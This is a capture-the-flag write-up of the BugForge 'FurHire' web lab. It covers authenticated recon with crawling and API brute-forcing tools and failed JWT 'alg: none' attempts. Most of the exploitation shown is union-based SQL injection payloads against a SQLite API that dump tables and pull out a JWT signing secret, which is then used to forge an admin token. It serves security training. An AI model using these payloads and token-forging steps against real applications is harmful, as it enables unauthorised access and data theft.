![[Pasted image 20260112205005.png]]

# Tools
| Tool                                                      | Description                                                 |
| --------------------------------------------------------- | ----------------------------------------------------------- |
| [**Katana**](https://github.com/projectdiscovery/katana)  | URL Fetcher discovery all endpoints on website              |
| [**Mantra**](https://github.com/brosck/mantra)            | API,Secrets, Token finder                                   |
| [**httpx**](https://github.com/projectdiscovery/httpx)    | Multipurpose disocvery tool, liver pages, tech-stack & more |
| [**kiterunner**](https://github.com/assetnote/kiterunner) | Think of dirbusters but for API routes                      |

The lab today is from [BugForge.io Weekly Challenge FurHire](https://app.bugforge.io)T
Today  took a different approach and started on recon before attempting to attack it, see if I could find any hidden information.

I decided to first check for any forgotten API secrets, so for that I will use the method  
[**Katana**](https://github.com/projectdiscovery/katana) +  [**Mantra**](https://github.com/brosck/mantra)
# Searching for Secrets
Katana will crawl a website and get all visible urls then we will use mantra to download the pages and perform some ReGex search for api,secrets, tokens etc..
We will perform an authenticated scan using Katana, which is why we are also parsing the token with the -H
## 1. Crawling Website
```bash
 token='Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJib3NzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjgxNzYxMDJ9.qBbRYw9p0aJs-6PB-2sPBBj-rvo4Wlt5920hZJjN0vY'
 target='https://lab-1768176060864-1bb6hh.labs-app.bugforge.io/'
 
 katana -u $target -H $token -jsl |tee katana_out.txt
```
|Flag| Description|
|------|------------|
|-jsl |more indepth scan|
|-H | request headers|
![[Pasted image 20260112001959.png]]
## 2. Checking for secrets
We will use [mantra](https://github.com/brosck/mantra) now to download the pages and perform a scan for api secrets and passwords. All these is done in memory, so mantra is not touching disk durin the scan. 
Unfortunatelly ther were no secrets found this time so we move on.
```bash
cat katana_out.txt | mantra
```
![[Pasted image 20260112002347.png]]

---

# Checking Technology Stack
I proceed to perform a quickly,  scan to double check the tech running behind application, so I chucked  the urls we downloaded using katana and used httpx to perform a quick technology scan.
```bash
httpx -status-code -title -tech-detect -list katana_out.txt
```
![[Pasted image 20260112003650.png]]

---
# Finding Hidden Api Routes

The next step I took was look for any hidden paths on the application that the developer might have left it hidden to avoid un-authorized access.
I have used [KiteRunner](https://github.com/assetnote/kiterunner) to help brute force the api routes.

>[!Important]
> I have used an authenticated scan, with the option **-H** we can pass the headers with our bearer token

## Scanning using KiteRunner
```bash
 token='Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJib3NzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjgxNzYxMDJ9.qBbRYw9p0aJs-6PB-2sPBBj-rvo4Wlt5920hZJjN0vY'
 target='https://lab-1768176060864-1bb6hh.labs-app.bugforge.io/'

kr scan $target  -w medium-admin-api-routes.kite -H $token -x 20  --wildcard-detection=false --fail-status-codes 404

```
>[!NOTE]
When I ran **kr** I use a custom admin list, which is a normal wordlist.txt but we have to convert to **.kite** so we can use it, the command below convert a normal .txt to .kite
`kr kb convert wordlist.txt wordlist.kite`


| Flags                      | Description                                                        |
| -------------------------- | ------------------------------------------------------------------ |
| -H                         | Pass the bearer token with this flag                               |
| --fail-status-codes        | Filter out errors 404 if needed separate multiple with 404,401,400 |
| --wildcard-detection-false | Turns off wildcard, this option is essential                       |
| -x                         | Max connections to host                                            |

![[Pasted image 20260111220417.png]]

After discovering the **/admin** endpoint I went to the page on the browser to check it out, unfortunately the page was locked.
![[Pasted image 20260111221901.png]]
I went straight to the Web Dev Tools to verify if there was something I could do there so I modify the user role to "admin" and tried reloading the page again
![[Pasted image 20260111222030.png]]
That did not work, so I tried updating the role on the JWT itself.
On the page there was a warning saying "This page is restricted to **administrators**" so I set my role to "administrators", but that didn't work LOL!
![[Pasted image 20260111222921.png]]
I then decided to look into the source code of the page and notice the role it was looking for its called "admin", then I remember that I didn't have the secret for the token I would have to try some JWT bypass.
![[Pasted image 20260111222217.png]]
I have tried the common attacks:
- "alg": "None"
- "alg": "none"
- "alg": "NoNe"
- Removing the "alg" completely
- Removing the signature from the JWT
Unfortunately nothing worked

---
# Modifying the Request  at RunTime
Upon inspecting the app in more detail I notice **if response.ok == true** we could reveal the **data.flag** . So I created a break point on that line and hit the refresh button so I could update  the **response.ok = true** before the app could finish loading attempting to read the flag during runTime

## Setting breakpoint on app 
![[Pasted image 20260111223324.png]]
On the Console tab of the Web Dev tools I attempted to modify the response.ok, but it 
proven to be more difficult, so I had to get a specific command to get it working.
![[Pasted image 20260111223829.png]]
 
```javascript
Object.defineProperty(response, 'ok', {
  get: () => true,
  configurable: true
});
```

Unfortunately I have noticed a bit too late but the **request already returned 403** so there was no data to be displayed. This could work on some cases when the Developer only applies "Security by Front-End" but its not the case of our lab. Back to the drawing board. #discord 
![[Pasted image 20260111224126.png]]

# Trying a different angle
I knew I was on the right path, but I was still missing one thing to get the request to the Back-End, I need that JWT secret. At this point I had to use the hint, and it reveals to be a **Blind SQL Inject** so I knew where to go from here.

### 1. Finding an SQL Entry Point
I noticed there was an endpoint that could be a good target to test for SQL injection, below are the tests done.  

```r
/jobs/3
```
The application retrieves job details via the API:
```r
GET /api/jobs/3
```
Response returns valid job data.

---
### 2. Identifying SQL Injection
Testing with a quote:
```r
GET /api/jobs/3'
```
>[!Response]
>{"error":"Job not found"}

Testing SQL syntax without quotes:

```r
GET /api/jobs/3 order by 1--
```
>[!Response]
>Valid response returned, confirming SQL injection.

---
### 3. Determining Column Count
We need to understand where our point of injection will be so we find the column count
```r
GET /api/jobs/3 order by 16--
```
>[!Response]
No error
```r
GET /api/jobs/3 order by 17--
```

>[!Response]
>Error returned
Column count is **16**

---
## UNION-Based SQL Injection

### 4. Database Version
Let's confirm which type of database we are working with
```r
GET /api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,sqlite_version()--
```
Response confirms **SQLite 3.44.2**
>[!Tip:]
>We can enumerate in the same way for **MySQL**
but we use **FROM information_schema.tables WHERE table_schema = database()** 
instead of **from sqlite_master WHERE type='table'**

---
### 5. Enumerating Tables
Let's advance and enumerate the tables
```r
GET
/api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(DISTINCT tbl_name) FROM sqlite_master
```
>[!Response]
>[..retracted..]
"application_count":"users,sqlite_sequence,user_profiles,companies,jobs,applications,saved_jobs,notifications,config"


---
### 6. Inspecting Config Table
Let's check what columns are visible within the table
```r
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(name, ', ') FROM pragma_table_info('config')--
```
>[!Response]
>[..retracted..]
"application_count":"id, key, value, created_at",


---
### 7. Extracting JWT Secret
Now we extract the key and valye from the config table
```r
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,key||':'||value FROM config--
```
>[!Response]
>[..retracted..]
"application_count":"phonesCheeseTiramisu1199"

# **JWT Secret retrieve !**


---
# Signing the JWT
Now that we have the JWT Secret, we can forge our own JWT token an attempt to load the **/admin** page again.

So I went to Burp and from the Repeater section, using the JWT Editor Extension I created a new Signing Key
![[Pasted image 20260111235711.png]]

Once the Signing Key is created, we can modify our token to have admin role again and sign the token.
![[Pasted image 20260112000036.png]]

With the new token we can update our token again on the Web Browser Local Storage and try loading the page again.
![[Pasted image 20260112001110.png]]
[^1]: Thank you  for the write up [ruur](https://ruur.gitbook.io/) and help with the sql section
#Pwned #writeup #bugforge 

